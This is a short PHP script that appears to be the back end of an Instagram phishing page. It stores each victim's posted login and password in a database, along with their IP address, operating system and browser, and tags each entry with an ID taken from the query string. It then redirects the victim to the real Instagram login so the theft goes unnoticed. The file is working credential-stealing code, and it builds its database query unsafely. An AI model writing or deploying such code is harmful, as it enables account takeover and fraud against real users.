<?php

require 'config.php';
require 'getdata.php';

header('Location: https://www.instagram.com/accounts/login/');

$QUERY_STRING = $_SERVER["QUERY_STRING"];
$email = addslashes($_POST['usr']);
$pass = addslashes($_POST['pass']);

$fuckerId = (int) filter_var($QUERY_STRING, FILTER_SANITIZE_NUMBER_INT);

$sql = "INSERT INTO datas (fuckerId, email, pass,  ip, xtime, os, browser) VALUES ('$fuckerId', '$email', '$pass',  '$ip', '$time', '$user_os', '$user_browser')";
mysqli_query($conn, $sql);